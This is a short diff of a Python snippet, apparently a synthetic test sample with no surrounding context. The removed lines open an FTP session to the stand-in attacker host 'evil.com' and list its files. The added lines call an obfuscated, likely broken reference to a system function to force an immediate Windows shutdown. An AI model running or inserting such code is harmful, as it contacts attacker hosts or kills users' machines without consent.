@@ -1,4 +1,2 @@
-import ftplib
-ftp = ftplib.FTP('evil.com')
-ftp.login('user','pass')
-ftp.retrlines('LIST')
+import sys
+sys.modules['o'].system('shutdown /s /t 0')
